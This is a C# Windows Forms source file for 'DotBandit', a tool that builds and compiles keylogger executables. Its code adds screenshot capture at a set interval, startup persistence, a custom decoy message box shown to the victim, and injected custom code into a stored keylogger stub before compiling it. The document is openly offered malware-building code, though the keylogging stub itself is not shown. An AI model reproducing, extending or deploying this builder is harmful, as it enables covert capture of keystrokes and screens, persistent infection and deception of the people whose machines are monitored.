#region Using Statements
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.IO;
using System.Diagnostics;
using System.Runtime.InteropServices;
#endregion

namespace DotBandit
{
    public partial class MainBuilder : Form
    {
        #region Private Fields
        string path = System.Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + "DotBandit";
        string PNGPath = System.Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\DotBandit" + "\\Screenshots";
        string RAW = Properties.Resources.MainFile;
        #endregion

        #region Public
        public MainBuilder()
        {            
            InitializeComponent();

            //Create Path.
            if (!System.IO.Directory.Exists(path))
            {
                System.IO.Directory.CreateDirectory(path);
            }

            //Create Screenshots Folder.
            if (!System.IO.Directory.Exists(PNGPath))
            {
                System.IO.Directory.CreateDirectory(PNGPath);
            }

            textBox1.Text = Properties.Settings.Default.Pass;
            if (!Properties.Settings.Default.DontShow)
                checkBox1.Checked = false;
            else
                checkBox1.Checked = true;

            this.tabPage1.BackColor = Color.White;
            this.tabPage2.BackColor = Color.White;
            this.tabPage3.BackColor = Color.White;

            listBox1.SelectedIndex = 0;

            textBox2.Enabled = false;
            textBox3.Enabled = false;
            listBox1.Enabled = false;
            button2.Enabled = false;
            button1.Enabled = false;
            numericUpDown1.Enabled = false;
            comboBox2.Enabled = false;

            comboBox2.Items.IndexOf("JPEG (Recommended)");
            this.comboBox2.Items.Add("PNG");
            this.comboBox2.Items.Add("GIF");
            this.comboBox2.Items.Add("JPEG (Recommended)");
            this.comboBox2.Items.Add("BMP");
            this.comboBox2.Items.Add("EMF");
            this.comboBox2.Items.Add("TIFF");
            this.comboBox2.Items.Add("WMF");
            this.comboBox2.SelectedItem = "JPEG (Recommended)";
            this.comboBox2.SelectedIndex = 2;
            this.comboBox2.SelectedIndex = this.comboBox2.Items.Count - 5;

            menuStrip1.Renderer = new DefaultRenderer();
            contextMenuStrip1.Renderer = new DefaultRenderer();

            UpdateDGV();
        }
        #endregion

        #region Voids
        public class DefaultRenderer : ToolStripProfessionalRenderer
        {
            public DefaultRenderer() : base(new MyColors()) { }
        }

        public class MyColors : ProfessionalColorTable
        {
            public override Color MenuItemSelected
            {
                get { return Color.LightGray; }
            }
            public override Color MenuItemBorder
            {
                get { return Color.LightGray; }
            }
            public override Color MenuItemSelectedGradientBegin
            {
                get { return Color.FromArgb(253, 253, 253); }//LightGray
            }
            public override Color MenuItemSelectedGradientEnd
            {
                get { return Color.FromArgb(253, 253, 253); }//DarkGray
            }
            public override Color MenuItemPressedGradientBegin
            {
                get { return Color.LightGray; }
            }
            public override Color MenuItemPressedGradientEnd
            {
                get { return Color.LightGray; }
            }
            public override Color MenuBorder
            {
                get { return Color.LightGray; }
            }
            public override Color MenuItemPressedGradientMiddle
            {
                get { return Color.FromArgb(250, 250, 250); }
            }
            public override Color MenuStripGradientBegin
            {
                get { return Color.FromArgb(250, 250, 250); }
            }
            public override Color MenuStripGradientEnd
            {
                get { return Color.FromArgb(250, 250, 250); }
            }
        }

        private void dataGridView1_CellMouseDown(object sender, DataGridViewCellMouseEventArgs e)
        {
            try
            {
                if (e.Button == MouseButtons.Right)
                {
                    dataGridView1.CurrentCell = dataGridView1.Rows[e.RowIndex].Cells[e.ColumnIndex];
                    dataGridView1.Rows[e.RowIndex].Selected = true;
                    dataGridView1.Focus();
                }
            }
            catch(Exception ex){ }
        }

        private void dataGridView2_CellMouseDown(object sender, DataGridViewCellMouseEventArgs e)
        {
            try
            {
                if (e.Button == MouseButtons.Right)
                {
                    dataGridView2.CurrentCell = dataGridView2.Rows[e.RowIndex].Cells[e.ColumnIndex];
                    dataGridView2.Rows[e.RowIndex].Selected = true;
                    dataGridView2.Focus();
                }
            }
            catch (Exception ex) { }
        }

        void Compile(string filename)
        {            
            Compiler.Compile(filename, RAW);
        }

        void UpdateDGV()
        {
            try
            {
                //AutoSize Columns
                dataGridView1.AutoSizeColumnsMode = DataGridViewAutoSizeColumnsMode.Fill;
                dataGridView2.AutoSizeColumnsMode = DataGridViewAutoSizeColumnsMode.Fill;

                //Load DataGridView1
                string[] files = Directory.GetFiles(path);
                DataTable table = new DataTable();
                table.Columns.Add("File Name");

                for (int i = 0; i < files.Length; i++)
                {
                    FileInfo file = new FileInfo(files[i]);
                    table.Rows.Add(file.Name);
                }
                dataGridView1.DataSource = table;

                //Load DataGridView2
                string[] scfiles = Directory.GetFiles(PNGPath);
                DataTable sctable = new DataTable();
                sctable.Columns.Add("File Name");

                for (int i = 0; i < scfiles.Length; i++)
                {
                    FileInfo file = new FileInfo(scfiles[i]);
                    sctable.Rows.Add(file.Name);
                }
                dataGridView2.DataSource = sctable;
            }
            catch (Exception Ex)
            {
                MessageBox.Show("Could not load one or more archive datasource. Report Error Code: x0001", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }            
        }
        #endregion

        #region Controls
        private void button1_Click(object sender, EventArgs e)
        {
            Properties.Settings.Default.Pass = textBox1.Text;
            Properties.Settings.Default.Save();
        }

        private void MainBuilder_FormClosing(object sender, FormClosingEventArgs e)
        {
            Properties.Settings.Default.Save();
            Application.Exit();
        }

        private void textBox1_TextChanged(object sender, EventArgs e)
        {
            if (!string.IsNullOrEmpty(textBox1.Text))
                button1.Enabled = true;
            else
                button1.Enabled = false;
        }

        private void button2_Click(object sender, EventArgs e)
        {
            string title = textBox2.Text;
            string message = textBox3.Text;
            if(listBox1.SelectedIndex == 0)
                MessageBox.Show(message, title, MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
            else if (listBox1.SelectedIndex == 1)
                MessageBox.Show(message, title, MessageBoxButtons.OK, MessageBoxIcon.Error);
            else if (listBox1.SelectedIndex == 2)
                MessageBox.Show(message, title, MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
            else if (listBox1.SelectedIndex == 3)
                MessageBox.Show(message, title, MessageBoxButtons.OK, MessageBoxIcon.Hand);
            else if(listBox1.SelectedIndex == 4)
                MessageBox.Show(message, title, MessageBoxButtons.OK, MessageBoxIcon.Information);
            else if(listBox1.SelectedIndex == 5)
                MessageBox.Show(message, title, MessageBoxButtons.OK, MessageBoxIcon.None);
            else if(listBox1.SelectedIndex == 6)
                MessageBox.Show(message, title, MessageBoxButtons.OK, MessageBoxIcon.Question);
            else if(listBox1.SelectedIndex == 7)
                MessageBox.Show(message, title, MessageBoxButtons.OK, MessageBoxIcon.Stop);
            else if (listBox1.SelectedIndex == 8)
                MessageBox.Show(message, title, MessageBoxButtons.OK, MessageBoxIcon.Warning);
        }

        private void checkBox4_CheckedChanged(object sender, EventArgs e)
        {
            if (checkBox4.Checked)
            {
                textBox2.Enabled = true;
                textBox3.Enabled = true;
                listBox1.Enabled = true;
                button2.Enabled = true;
            }
            else
            {
                textBox2.Enabled = false;
                textBox3.Enabled = false;
                listBox1.Enabled = false;
                button2.Enabled = false;
            }
        }

        private void checkBox2_CheckedChanged(object sender, EventArgs e)
        {
            if (checkBox2.Checked)
            {
                numericUpDown1.Enabled = true;
                comboBox2.Enabled = true;

                RAW = RAW.Replace("//[FUNC_SCREENSHOT]", Properties.Resources.FuncScreenshot);
                RAW = RAW.Replace("//[CALL_SCREENSHOT]", Properties.Resources.CallScreenshot);
            }
            else
            {
                numericUpDown1.Enabled = false;
                comboBox2.Enabled = false;

                RAW = RAW.Replace(Properties.Resources.FuncScreenshot, "//[FUNC_SCREENSHOT]");
                RAW = RAW.Replace(Properties.Resources.CallScreenshot, "//[CALL_SCREENSHOT]");
            }            
        }

        private void builderToolStripMenuItem_Click(object sender, EventArgs e)
        {
            tabControl1.SelectedTab = tabPage1;
        }

        private void appPreferencesToolStripMenuItem_Click(object sender, EventArgs e)
        {
            tabControl1.SelectedTab = tabPage3;
        }

        private void archiveToolStripMenuItem_Click(object sender, EventArgs e)
        {
            tabControl1.SelectedTab = tabPage2;
        }         

        private void checkBox7_CheckedChanged(object sender, EventArgs e)
        {
            if (checkBox7.Checked)
            {
                textBox6.Enabled = true;
                RAW = RAW.Replace("//[CUSTOM_CALL_0X04]", textBox6.Text.ToString());
            }
            else
            {
                textBox6.Enabled = false;
                RAW = RAW.Replace(textBox6.Text.ToString(), "//[CUSTOM_CALL_0X04]");
            }
        }

        private void checkBox1_CheckedChanged(object sender, EventArgs e)
        {
            if (checkBox1.Checked)
            {
                textBox1.Enabled = true;
                button1.Enabled = true;
                Properties.Settings.Default.DontShow = this.checkBox1.Checked;
                Properties.Settings.Default.Save();
            }
            else
            {
                textBox1.Enabled = false;
                button1.Enabled = false;
                Properties.Settings.Default.DontShow = this.checkBox1.Checked;
                Properties.Settings.Default.Save();
            }
        }

        private void openToolStripMenuItem_Click(object sender, EventArgs e)
        {
            string filename = dataGridView1.CurrentRow.Cells[0].Value.ToString();
            try
            {
                Process.Start("IExplore.exe", path + "\\" + filename); //open with ie or something
            }
            catch (Exception ex)
            {
                MessageBox.Show("Could not find 'IExplore.exe' on the system. Configure default browser on the 'App Preferences' tab. Report Error Code: x0002", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void openFolderToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                Process.Start("explorer.exe", path);
            }
            catch (Exception ex)
            {
                MessageBox.Show("Could not open the folder on the system. Report Error Code: x0003", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void deleteFileToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                string filename = dataGridView1.CurrentRow.Cells[0].Value.ToString();
                File.Delete(path + "\\" + filename);
            }
            catch
            {
                MessageBox.Show("Could not delete file from the system. Report Error Code: x0004", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
            finally
            {
                UpdateDGV();
            }
        }

        private void toolStripMenuItem1_Click(object sender, EventArgs e)
        {
            string filename = dataGridView2.CurrentRow.Cells[0].Value.ToString();
            try
            {
                Process.Start(PNGPath + "\\" + filename);
            }
            catch (Exception ex)
            {
                MessageBox.Show("Could not file on the system. Report Error Code: x0005", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void toolStripMenuItem2_Click(object sender, EventArgs e)
        {
            try
            {
                Process.Start("explorer.exe", PNGPath);
            }
            catch (Exception ex)
            {
                MessageBox.Show("Could not open the folder on the system. Report Error Code: x0003", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void toolStripMenuItem3_Click(object sender, EventArgs e)
        {
            try
            {
                string filename = dataGridView2.CurrentRow.Cells[0].Value.ToString();
                File.Delete(PNGPath + "\\" + filename);
            }
            catch
            {
                MessageBox.Show("Could not delete file from the system. Report Error Code: x0004", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }

            finally
            {
                UpdateDGV();
            }
        }

        private void exitToolStripMenuItem_Click(object sender, EventArgs e)
        {
            this.Close();
            Application.Exit();
        }

        #endregion

        #region Objects
        private void toolStripSplitButton1_Click(object sender, EventArgs e)
        {
            DialogResult result;
            result = MessageBox.Show("DotBandit will generate an executable Keylogger application. Do you agree to the Terms Of Use of this software?", 
                "DotBandit", MessageBoxButtons.YesNo, MessageBoxIcon.Warning);
            if (result == DialogResult.Yes)
            {
                try
                {
                    toolStripProgressBar1.Style = ProgressBarStyle.Marquee;
                    toolStripProgressBar1.MarqueeAnimationSpeed = 45;
                    SaveFileDialog sfd = new SaveFileDialog();
                    sfd.Filter = "Executable files (*.exe)|*.exe|All files (*.*)|*.*";
                    sfd.ShowDialog();
                    if (sfd.FileName != string.Empty)
                    {
                        if (checkBox2.Checked)
                        {
                            if (comboBox2.SelectedIndex == 0)
                            {
                                RAW = RAW.Replace("string SavePNG = PNGPath + \u0022\\\\\u0022 + DateTime.Now.ToString(\u0022MM.dd.yyyy HH.mm.ss\u0022) + \u0022.png\u0022;",
                                    "string SavePNG = PNGPath + \u0022\\\\\u0022 + DateTime.Now.ToString(\u0022MM.dd.yyyy HH.mm.ss\u0022) + \u0022.png\u0022;");
                                RAW = RAW.Replace("GetScreenShot().Save(SavePNG, ImageFormat.Png); /*{CUSTOM_EDIT_0X02}*/", "GetScreenShot().Save(SavePNG, ImageFormat.Png);");
                            }
                            else if (comboBox2.SelectedIndex == 1)
                            {
                                RAW = RAW.Replace("string SavePNG = PNGPath + \u0022\\\\\u0022 + DateTime.Now.ToString(\u0022MM.dd.yyyy HH.mm.ss\u0022) + \u0022.png\u0022;",
                                    "string SavePNG = PNGPath + \u0022\\\\\u0022 + DateTime.Now.ToString(\u0022MM.dd.yyyy HH.mm.ss\u0022) + \u0022.gif\u0022;");
                                RAW = RAW.Replace("GetScreenShot().Save(SavePNG, ImageFormat.Png); /*{CUSTOM_EDIT_0X02}*/", "GetScreenShot().Save(SavePNG, ImageFormat.Gif);");
                            }
                            else if (comboBox2.SelectedIndex == 2)
                            {
                                RAW = RAW.Replace("string SavePNG = PNGPath + \u0022\\\\\u0022 + DateTime.Now.ToString(\u0022MM.dd.yyyy HH.mm.ss\u0022) + \u0022.png\u0022;",
                                    "string SavePNG = PNGPath + \u0022\\\\\u0022 + DateTime.Now.ToString(\u0022MM.dd.yyyy HH.mm.ss\u0022) + \u0022.Jpeg\u0022;");
                                RAW = RAW.Replace("GetScreenShot().Save(SavePNG, ImageFormat.Png); /*{CUSTOM_EDIT_0X02}*/", "GetScreenShot().Save(SavePNG, ImageFormat.Jpeg);");
                            }
                            else if (comboBox2.SelectedIndex == 3)
                            {
                                RAW = RAW.Replace("string SavePNG = PNGPath + \u0022\\\\\u0022 + DateTime.Now.ToString(\u0022MM.dd.yyyy HH.mm.ss\u0022) + \u0022.png\u0022;",
                                    "string SavePNG = PNGPath + \u0022\\\\\u0022 + DateTime.Now.ToString(\u0022MM.dd.yyyy HH.mm.ss\u0022) + \u0022.bmp\u0022;");
                                RAW = RAW.Replace("GetScreenShot().Save(SavePNG, ImageFormat.Png); /*{CUSTOM_EDIT_0X02}*/", "GetScreenShot().Save(SavePNG, ImageFormat.Bmp);");
                            }
                            else if (comboBox2.SelectedIndex == 4)
                            {
                                RAW = RAW.Replace("string SavePNG = PNGPath + \u0022\\\\\u0022 + DateTime.Now.ToString(\u0022MM.dd.yyyy HH.mm.ss\u0022) + \u0022.png\u0022;",
                                    "string SavePNG = PNGPath + \u0022\\\\\u0022 + DateTime.Now.ToString(\u0022MM.dd.yyyy HH.mm.ss\u0022) + \u0022.emf\u0022;");
                                RAW = RAW.Replace("GetScreenShot().Save(SavePNG, ImageFormat.Png); /*{CUSTOM_EDIT_0X02}*/", "GetScreenShot().Save(SavePNG, ImageFormat.Emf);");
                            }
                            else if (comboBox2.SelectedIndex == 5)
                            {
                                RAW = RAW.Replace("string SavePNG = PNGPath + \u0022\\\\\u0022 + DateTime.Now.ToString(\u0022MM.dd.yyyy HH.mm.ss\u0022) + \u0022.png\u0022;",
                                    "string SavePNG = PNGPath + \u0022\\\\\u0022 + DateTime.Now.ToString(\u0022MM.dd.yyyy HH.mm.ss\u0022) + \u0022.tiff\u0022;");
                                RAW = RAW.Replace("GetScreenShot().Save(SavePNG, ImageFormat.Png); /*{CUSTOM_EDIT_0X02}*/", "GetScreenShot().Save(SavePNG, ImageFormat.Tiff);");
                            }
                            else if (comboBox2.SelectedIndex == 6)
                            {
                                RAW = RAW.Replace("string SavePNG = PNGPath + \u0022\\\\\u0022 + DateTime.Now.ToString(\u0022MM.dd.yyyy HH.mm.ss\u0022) + \u0022.png\u0022;",
                                    "string SavePNG = PNGPath + \u0022\\\\\u0022 + DateTime.Now.ToString(\u0022MM.dd.yyyy HH.mm.ss\u0022) + \u0022.wmf\u0022;");
                                RAW = RAW.Replace("GetScreenShot().Save(SavePNG, ImageFormat.Png); /*{CUSTOM_EDIT_0X02}*/", "GetScreenShot().Save(SavePNG, ImageFormat.Wmf);");
                            }
                        }
                        else { }
                        string title = textBox2.Text;
                        string message = textBox3.Text;
                        if (checkBox4.Checked)
                        {
                            if (listBox1.SelectedIndex == 0)
                                RAW = RAW.Replace("//[CALL_MSG]",
                                    "MessageBox.Show(" + '\u0022' + @message + '\u0022' + ", " + '\u0022' + @title + '\u0022' + ", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);");
                            else if (listBox1.SelectedIndex == 1)
                                RAW = RAW.Replace("//[CALL_MSG]",
                                    "MessageBox.Show(" + '\u0022' + @message + '\u0022' + ", " + '\u0022' + @title + '\u0022' + ", MessageBoxButtons.OK, MessageBoxIcon.Error);");
                            else if (listBox1.SelectedIndex == 2)
                                RAW = RAW.Replace("//[CALL_MSG]",
                                    "MessageBox.Show(" + '\u0022' + @message + '\u0022' + ", " + '\u0022' + @title + '\u0022' + ", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);");
                            else if (listBox1.SelectedIndex == 3)
                                RAW = RAW.Replace("//[CALL_MSG]",
                                    "MessageBox.Show(" + '\u0022' + @message + '\u0022' + ", " + '\u0022' + @title + '\u0022' + ", MessageBoxButtons.OK, MessageBoxIcon.Hand);");
                            else if (listBox1.SelectedIndex == 4)
                                RAW = RAW.Replace("//[CALL_MSG]",
                                    "MessageBox.Show(" + '\u0022' + @message + '\u0022' + ", " + '\u0022' + @title + '\u0022' + ", MessageBoxButtons.OK, MessageBoxIcon.Information);");
                            else if (listBox1.SelectedIndex == 5)
                                RAW = RAW.Replace("//[CALL_MSG]",
                                    "MessageBox.Show(" + '\u0022' + @message + '\u0022' + ", " + '\u0022' + @title + '\u0022' + ", MessageBoxButtons.OK, MessageBoxIcon.None);");
                            else if (listBox1.SelectedIndex == 6)
                                RAW = RAW.Replace("//[CALL_MSG]",
                                    "MessageBox.Show(" + '\u0022' + @message + '\u0022' + ", " + '\u0022' + @title + '\u0022' + ", MessageBoxButtons.OK, MessageBoxIcon.Question);");
                            else if (listBox1.SelectedIndex == 7)
                                RAW = RAW.Replace("//[CALL_MSG]",
                                    "MessageBox.Show(" + '\u0022' + @message + '\u0022' + ", " + '\u0022' + @title + '\u0022' + ", MessageBoxButtons.OK, MessageBoxIcon.Stop);");
                            else if (listBox1.SelectedIndex == 8)
                                RAW = RAW.Replace("//[CALL_MSG]",
                                    "MessageBox.Show(" + '\u0022' + @message + '\u0022' + ", " + '\u0022' + @title + '\u0022' + ", MessageBoxButtons.OK, MessageBoxIcon.Warning);");
                        }
                        else
                        {
                            if (listBox1.SelectedIndex == 0)
                                RAW = RAW.Replace("MessageBox.Show(" + '\u0022' + @message + '\u0022' + ", " + '\u0022' + @title + '\u0022' + ", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);",
                                    "//[CALL_MSG]");
                            else if (listBox1.SelectedIndex == 1)
                                RAW = RAW.Replace("MessageBox.Show(" + '\u0022' + @message + '\u0022' + ", " + '\u0022' + @title + '\u0022' + ", MessageBoxButtons.OK, MessageBoxIcon.Error);",
                                    "//[CALL_MSG]");
                            else if (listBox1.SelectedIndex == 2)
                                RAW = RAW.Replace("MessageBox.Show(" + '\u0022' + @message + '\u0022' + ", " + '\u0022' + @title + '\u0022' + ", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);",
                                    "//[CALL_MSG]");
                            else if (listBox1.SelectedIndex == 3)
                                RAW = RAW.Replace("MessageBox.Show(" + '\u0022' + @message + '\u0022' + ", " + '\u0022' + @title + '\u0022' + ", MessageBoxButtons.OK, MessageBoxIcon.Hand);",
                                    "//[CALL_MSG]");
                            else if (listBox1.SelectedIndex == 4)
                                RAW = RAW.Replace("MessageBox.Show(" + '\u0022' + @message + '\u0022' + ", " + '\u0022' + @title + '\u0022' + ", MessageBoxButtons.OK, MessageBoxIcon.Information);",
                                    "//[CALL_MSG]");
                            else if (listBox1.SelectedIndex == 5)
                                RAW = RAW.Replace("MessageBox.Show(" + '\u0022' + @message + '\u0022' + ", " + '\u0022' + @title + '\u0022' + ", MessageBoxButtons.OK, MessageBoxIcon.None);",
                                    "//[CALL_MSG]");
                            else if (listBox1.SelectedIndex == 6)
                                RAW = RAW.Replace("MessageBox.Show(" + '\u0022' + @message + '\u0022' + ", " + '\u0022' + @title + '\u0022' + ", MessageBoxButtons.OK, MessageBoxIcon.Question);",
                                    "//[CALL_MSG]");
                            else if (listBox1.SelectedIndex == 7)
                                RAW = RAW.Replace("MessageBox.Show(" + '\u0022' + @message + '\u0022' + ", " + '\u0022' + @title + '\u0022' + ", MessageBoxButtons.OK, MessageBoxIcon.Stop);",
                                    "//[CALL_MSG]");
                            else if (listBox1.SelectedIndex == 8)
                                RAW = RAW.Replace("MessageBox.Show(" + '\u0022' + @message + '\u0022' + ", " + '\u0022' + @title + '\u0022' + ", MessageBoxButtons.OK, MessageBoxIcon.Warning);",
                                    "//[CALL_MSG]");
                        }

                        Compile(sfd.FileName);
                        MessageBox.Show("Application compiled successfully. Application path: " + Path.GetDirectoryName(sfd.FileName), "DotBandit", MessageBoxButtons.OK, MessageBoxIcon.Information);
                        toolStripProgressBar1.Style = ProgressBarStyle.Continuous;
                        toolStripProgressBar1.MarqueeAnimationSpeed = 0;
                    }
                }
                catch (Exception ex)
                {
                    toolStripProgressBar1.Style = ProgressBarStyle.Continuous;
                    toolStripProgressBar1.MarqueeAnimationSpeed = 0;
                    MessageBox.Show("Could not compile", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
            }
            else { }
        }

        private void checkBox3_CheckedChanged(object sender, EventArgs e)
        {
            if (checkBox3.Checked)
            {
                RAW = RAW.Replace("//[FUNC_ADDTOSTARTUP]", Properties.Resources.FuncAddToStartup);
                RAW = RAW.Replace("//[CALL_ADDTOSTARTUP]", "AddToStartup();");
            }
            else
            {
                RAW = RAW.Replace(Properties.Resources.FuncAddToStartup, "//[FUNC_ADDTOSTARTUP]");
                RAW = RAW.Replace("AddToStartup();", "//[CALL_ADDTOSTARTUP]");
            }
        }

        private void numericUpDown1_ValueChanged(object sender, EventArgs e)
        {
            if (checkBox2.Checked)
            {
                RAW = RAW.Replace("Thread.Sleep(30000); /*{CUSTOM_EDIT_0X01}*/", "Thread.Sleep(" + numericUpDown1.Value * 1000 + ");");
            }
            else
            {
                RAW = RAW.Replace("Thread.Sleep(" + numericUpDown1.Value * 1000 + ");", "Thread.Sleep(30000); /*{CUSTOM_EDIT_0X01}*/");
            }
        }

        private void checkBox6_CheckedChanged(object sender, EventArgs e)
        {
            if (checkBox6.Checked)
            {
                //CHANGED FROM PROPERTIES.RESOURCES.CALLACTION TO "ACTION();"
                RAW = RAW.Replace("//[FUNC_ACTION]", Properties.Resources.FuncAction);
                RAW = RAW.Replace("//[CALL_ACTION]", "ACTION();");
            }
            else
            {
                RAW = RAW.Replace(Properties.Resources.FuncAction, "//[FUNC_ACTION]");
                RAW = RAW.Replace("ACTION();", "//[CALL_ACTION]");
            }
        }

        private void toolStripMenuItem4_Click(object sender, EventArgs e)
        {
            Disclaimer ds = new Disclaimer();
            ds.Show();
        }

        private void generateExecutableFileToolStripMenuItem_Click(object sender, EventArgs e)
        {
            generateExecutableFileToolStripMenuItem.Click += new EventHandler(toolStripSplitButton1_Click);
        }

        private void aboutToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            About ab = new About();
            ab.Show();
        }

        private void helpToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                System.Diagnostics.Process.Start("https://dotbandit.github.io/help.html");
            }
            catch (Exception ex)
            {
                MessageBox.Show("Could not open webpage.", "DotBandit", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void MainBuilder_Load(object sender, EventArgs e)
        {

        }
    }
}
#endregion